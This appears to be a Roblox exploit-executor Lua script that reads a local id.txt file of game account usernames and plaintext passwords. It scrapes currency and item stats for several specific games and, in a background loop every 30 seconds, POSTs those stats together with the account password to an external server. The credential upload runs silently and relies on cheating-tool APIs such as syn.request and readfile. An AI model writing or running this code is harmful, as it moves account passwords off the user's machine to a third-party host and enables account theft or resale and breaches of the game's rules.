
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local gamePlaceId = game.PlaceId
local PlayerName = LocalPlayer.Name

local folderName = "vhouse lab"
local fileName = "id.txt"

if type(isfolder) == "function" and type(makefolder) == "function" then
	if not isfolder(folderName) then
		makefolder(folderName)
	end
end

local possiblePaths = {
	fileName,
	folderName .. "/" .. fileName,
	"dump/" .. fileName,
	"dump/id.text",
}

local function readIdFileContent()
	for _, path in ipairs(possiblePaths) do
		if type(isfile) == "function" and type(readfile) == "function" then
			if isfile(path) then
				local ok, content = pcall(function()
					return readfile(path)
				end)
				if ok and content then
					return content
				end
			end
		end
	end
	return nil
end

local function getPasswordFromIdFile(username)
	local idContent = readIdFileContent()
	if not idContent then
		return nil
	end

	local lines = {}
	for line in string.gmatch(idContent, "[^\r\n]+") do
		table.insert(lines, line)
	end

	for _, line in ipairs(lines) do
		local firstColon = string.find(line, ":")
		if firstColon then
			local placeId = string.sub(line, 1, firstColon - 1)
			local remaining = string.sub(line, firstColon + 1)

			local secondColon = string.find(remaining, ":")
			if secondColon then
				local fileUsername = string.sub(remaining, 1, secondColon - 1)
				local afterUsername = string.sub(remaining, secondColon + 1)

				local thirdColon = string.find(afterUsername, ":")
				local filePassword
				if thirdColon then
					filePassword = string.sub(afterUsername, 1, thirdColon - 1)
				else
					filePassword = afterUsername
				end

				local warningPattern = ":_|"
				local warningIndex = string.find(filePassword, warningPattern)
				if warningIndex then
					filePassword = string.sub(filePassword, 1, warningIndex - 1)
				end

				if fileUsername == username then
					return filePassword
				end
			end
		end
	end

	return nil
end

local function buildDescriptions()
	local password = getPasswordFromIdFile(PlayerName) or ""
	local descriptions = nil
	local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")

	if PlayerGui and gamePlaceId == 16146832113 then
		local ok, Currencies = pcall(function()
			return PlayerGui:WaitForChild("HUD", 5):WaitForChild("Main", 5):WaitForChild("Currencies", 5)
		end)
		if ok and Currencies then
			local children = Currencies:GetChildren()
			local AnimeVanguard = {
				gems = Currencies:FindFirstChild("CurrencyFrame") and Currencies.CurrencyFrame.Amount.Text or "",
				gold = children[7] and children[7]:FindFirstChild("Amount") and children[7].Amount.Text or "",
				trait = children[5] and children[5]:FindFirstChild("Amount") and children[5].Amount.Text or "",
				Cake = children[6] or nil,
			}
			descriptions = "playername: '"
				.. PlayerName
				.. "';gems: '"
				.. tostring(AnimeVanguard.gems)
				.. "';gold: '"
				.. tostring(AnimeVanguard.gold)
				.. "';traireroll: '"
				.. tostring(AnimeVanguard.trait)
				.. "';cake_slice: '"
				.. tostring(AnimeVanguard.Cake)
				.. "';PlayerName: "
				.. PlayerName
				.. ";password: "
				.. (password or "")
				.. ";"
		end
	elseif PlayerGui and gamePlaceId == 17687504411 then
		local ok, MainUI = pcall(function()
			return PlayerGui:WaitForChild("MainUI", 5)
		end)
		if ok and MainUI then
			local ok2, PremiumFrame = pcall(function()
				return MainUI:WaitForChild("MenuFrame", 5)
					:WaitForChild("BottomFrame", 5)
					:WaitForChild("BottomExpand", 5)
					:WaitForChild("CashFrame", 5)
					:WaitForChild("Premium", 5)
					:WaitForChild("ExpandFrame", 5)
					:WaitForChild("TextLabel", 5)
			end)
			local ok3, CashFrame = pcall(function()
				return MainUI:WaitForChild("MenuFrame", 5)
					:WaitForChild("BottomFrame", 5)
					:WaitForChild("BottomExpand", 5)
					:WaitForChild("CashFrame", 5)
					:WaitForChild("Cash", 5)
					:WaitForChild("ExpandFrame", 5)
					:WaitForChild("TextLabel", 5)
			end)
			local AllStars = {
				gems = ok2 and PremiumFrame and PremiumFrame.Text or "",
				gold = ok3 and CashFrame and CashFrame.Text or "",
			}
			descriptions = "playername: '"
				.. PlayerName
				.. "';gems: '"
				.. tostring(AllStars.gems)
				.. "';gold: '"
				.. tostring(AllStars.gold)
				.. "';PlayerName: "
				.. PlayerName
				.. ";password: "
				.. (password or "")
				.. ";"
		end
	elseif gamePlaceId == 107573139811370 then
		local stats = LocalPlayer:FindFirstChild("_stats")
		if stats then
			local AnimeCrusader = {
				gems = stats:FindFirstChild("gem_amount") and stats.gem_amount.Value or 0,
				gold = stats:FindFirstChild("gold_amount") and stats.gold_amount.Value or 0,
				pumpkin = stats:FindFirstChild("_resourcePumkinToken") and stats._resourcePumkinToken.Value or 0,
			}
			descriptions = "playername: '"
				.. PlayerName
				.. "';gems: '"
				.. tostring(AnimeCrusader.gems)
				.. "';gold: '"
				.. tostring(AnimeCrusader.gold)
				.. "';halloween: '"
				.. tostring(AnimeCrusader.pumpkin)
				.. "';PlayerName: "
				.. PlayerName
				.. ";password: "
				.. (password or "")
				.. ";"
		end
	elseif gamePlaceId == 12886143095 then
		local AnimeLastStand = {
			emerald = LocalPlayer:FindFirstChild("Emeralds") and LocalPlayer.Emeralds.Value or 0,
			gold = LocalPlayer:FindFirstChild("Gold") and LocalPlayer.Gold.Value or 0,
			jewels = LocalPlayer:FindFirstChild("Jewels") and LocalPlayer.Jewels.Value or 0,
		}
		descriptions = "playername: '"
			.. PlayerName
			.. "';gems: '"
			.. tostring(AnimeLastStand.emerald)
			.. "';gold: '"
			.. tostring(AnimeLastStand.gold)
			.. "';event: '"
			.. tostring(AnimeLastStand.jewels)
			.. "';PlayerName: "
			.. PlayerName
			.. ";password: "
			.. (password or "")
			.. ";"
	elseif PlayerGui and gamePlaceId == 76558904092080 then
		local ok, Menu = pcall(function()
			return PlayerGui:WaitForChild("Menu", 5)
		end)
		if ok and Menu then
			local ok2, toolsFrame = pcall(function()
				return Menu:WaitForChild("Frame", 5)
					:WaitForChild("Frame", 5)
					:WaitForChild("Menus", 5)
					:WaitForChild("Tools", 5)
					:WaitForChild("Frame", 5)
			end)

			if ok2 and toolsFrame then
				local function getAllPickaxes(frame, depth, seen)
					depth = depth or 0
					seen = seen or {}
					local pickaxes = {}
					local pickaxeNames = {}

					if frame and depth < 10 then
						local children = frame:GetChildren()
						for i = 1, #children do
							local child = children[i]
							if not seen[child] then
								seen[child] = true

								local nameLower = string.lower(child.Name)
								if string.find(nameLower, "pickaxe") then
									local pickaxeInfo = child.Name

									if child:IsA("TextLabel") or child:IsA("TextBox") or child:IsA("TextButton") then
										if child.Text and child.Text ~= "" then
											pickaxeInfo = pickaxeInfo .. " (" .. child.Text .. ")"
										end
									elseif
										child:IsA("StringValue")
										or child:IsA("IntValue")
										or child:IsA("NumberValue")
									then
										pickaxeInfo = pickaxeInfo .. " (" .. tostring(child.Value) .. ")"
									end

									if not pickaxeNames[pickaxeInfo] then
										pickaxeNames[pickaxeInfo] = true
										pickaxes[#pickaxes + 1] = pickaxeInfo
									end
								end

								local childChildren = child:GetChildren()
								if #childChildren > 0 then
									local subPickaxes = getAllPickaxes(child, depth + 1, seen)
									for j = 1, #subPickaxes do
										local pickaxeName = subPickaxes[j]
										if not pickaxeNames[pickaxeName] then
											pickaxeNames[pickaxeName] = true
											pickaxes[#pickaxes + 1] = pickaxeName
										end
									end
								end
							end
						end
					end
					return pickaxes
				end

				local pickaxesList = getAllPickaxes(toolsFrame)

				local ok3, Sell = pcall(function()
					return PlayerGui:WaitForChild("Sell", 5)
				end)
				local raceText = ""
				if ok3 and Sell then
					local ok4, CurrentRace = pcall(function()
						return Sell:WaitForChild("RaceUI", 5)
							:WaitForChild("StatMain", 5)
							:WaitForChild("Slots", 5)
							:WaitForChild("SlotTemplate", 5)
							:WaitForChild("CurrentRace", 5)
					end)
					if ok4 and CurrentRace then
						raceText = CurrentRace.Text or ""
					end
				end

				local TheForge = {
					race = raceText,
					pickaxe = pickaxesList,
				}

				local pickaxesString = table.concat(pickaxesList, ", ")
				descriptions = "playername: '"
					.. PlayerName
					.. "';race: '"
					.. tostring(TheForge.race)
					.. "';pickaxes: '"
					.. pickaxesString
					.. "';PlayerName: "
					.. PlayerName
					.. ";password: "
					.. (password or "")
					.. ";"
			end
		end
	end

	return descriptions
end

local filePath = folderName .. "/" .. fileName

local function readIdFile()
	return readIdFileContent()
end

local function writeIdFile(content)
	local path = folderName .. "/" .. fileName
	if type(writefile) == "function" then
		local ok, err = pcall(function()
			writefile(path, tostring(content))
		end)
		if ok then
			return true
		end
	end
	return false
end

local function appendIdFile(content)
	local path = folderName .. "/" .. fileName
	if type(appendfile) == "function" then
		local ok, err = pcall(function()
			appendfile(path, tostring(content))
		end)
		if ok then
			return true
		end
	end
	return false
end

local HttpService = game:GetService("HttpService")

local function sendGameIdToAPI(game_id, description, status)
	local apiUrl = "https://modelv.weloveyouvvv.online/api/game-ids"

	if not config or not config.api_key or config.api_key == "" then
		return false
	end

	local requestBody = {
		game_id = tostring(game_id),
		description = description or "",
		status = status or "online",
	}

	local headers = {
		["Content-Type"] = "application/json",
		["x-api-key"] = config.api_key,
	}

	local responseBody = nil

	if type(http) == "table" and type(http.post) == "function" then
		local ok, result = pcall(function()
			local jsonBody = HttpService:JSONEncode(requestBody)
			return http.post(apiUrl, jsonBody, headers)
		end)
		if ok and result then
			responseBody = result
		end
	end

	if not responseBody and type(http) == "table" and type(http.request) == "function" then
		local ok, result = pcall(function()
			local jsonBody = HttpService:JSONEncode(requestBody)
			return http.request({
				Url = apiUrl,
				Method = "POST",
				Headers = headers,
				Body = jsonBody,
			})
		end)
		if ok and result then
			responseBody = result
		end
	end

	if not responseBody and type(syn) == "table" and type(syn.request) == "function" then
		local ok, result = pcall(function()
			local jsonBody = HttpService:JSONEncode(requestBody)
			return syn.request({
				Url = apiUrl,
				Method = "POST",
				Headers = headers,
				Body = jsonBody,
			})
		end)
		if ok and result then
			responseBody = result.Body
		end
	end

	if not responseBody and type(request) == "function" then
		local ok, result = pcall(function()
			local jsonBody = HttpService:JSONEncode(requestBody)
			return request({
				Url = apiUrl,
				Method = "POST",
				Headers = headers,
				Body = jsonBody,
			})
		end)
		if ok and result then
			responseBody = result.Body
		end
	end

	if not responseBody then
		local ok, result = pcall(function()
			local jsonBody = HttpService:JSONEncode(requestBody)
			return HttpService:RequestAsync({
				Url = apiUrl,
				Method = "POST",
				Headers = headers,
				Body = jsonBody,
			})
		end)
		if ok and result then
			responseBody = result.Body
		end
	end

	if responseBody then
		local ok, responseData = pcall(function()
			if type(responseBody) == "string" then
				return HttpService:JSONDecode(responseBody)
			elseif type(responseBody) == "table" and responseBody.Body then
				return HttpService:JSONDecode(responseBody.Body)
			else
				return responseBody
			end
		end)

		if ok and responseData then
			if responseData.success then
				return true
			else
				return false
			end
		else
			return false
		end
	else
		return false
	end
end

local waitTime = (config and config.cooldown) or 30
local waitFunc = nil
if type(task) == "table" and type(task.wait) == "function" then
	waitFunc = task.wait
elseif type(wait) == "function" then
	waitFunc = wait
end

local function apiLoop()
	while true do
		local descriptions = buildDescriptions()
		if descriptions then
			sendGameIdToAPI(gamePlaceId, descriptions, "online")
		end
		if waitFunc then
			waitFunc(waitTime)
		else
			for i = 1, waitTime do
				wait(1)
			end
		end
	end
end

if type(task) == "table" and type(task.spawn) == "function" then
	task.spawn(apiLoop)
elseif type(spawn) == "function" then
	spawn(apiLoop)
elseif type(coroutine) == "table" and type(coroutine.create) == "function" then
	coroutine.resume(coroutine.create(apiLoop))
else
	apiLoop()
end

return {
	readIdFile = readIdFile,
	writeIdFile = writeIdFile,
	appendIdFile = appendIdFile,
	folderName = folderName,
	fileName = fileName,
	idContent = readIdFileContent(),
	password = getPasswordFromIdFile(PlayerName) or "",
	getPasswordFromIdFile = getPasswordFromIdFile,
	buildDescriptions = buildDescriptions,
}
